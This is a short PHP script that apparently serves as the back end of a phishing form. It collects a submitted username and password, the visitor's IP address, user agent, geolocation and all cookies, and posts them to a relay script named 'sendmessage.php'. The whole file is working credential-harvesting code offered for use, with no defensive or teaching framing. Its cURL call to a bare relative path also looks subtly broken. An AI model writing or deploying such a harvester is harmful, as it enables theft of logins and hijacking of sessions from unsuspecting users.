<?php
// Function to get the user IP address
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return filter_var($ip, FILTER_VALIDATE_IP);
}

// Function to get location data from IP
function getLocation($ip) {
    $geoPluginURL = "http://www.geoplugin.net/json.gp?ip=".$ip;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $geoPluginURL);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

// Get user IP address
$user_ip = getUserIP();

// Get user agent (browser and OS details)
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Get location data
$location = getLocation($user_ip);

// Get cookies
$cookies = json_encode($_COOKIE, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);

// Collect form data
$username = filter_input(INPUT_POST, 'uname', FILTER_SANITIZE_STRING);
$password = filter_input(INPUT_POST, 'pass', FILTER_SANITIZE_STRING);

// Prepare data to send to sendmessage.php
$postData = [
    'uname' => $username,
    'pass' => $password,
    'ip' => $user_ip,
    'user_agent' => $user_agent,
    'location' => $location,
    'cookies' => $cookies
];

// Use cURL to send the data to sendmessage.php
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'sendmessage.php');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Optionally, handle the response (e.g., show a success message)
if ($response) {
    echo "Data sent successfully!";
} else {
    echo "Failed to send data.";
}
?>
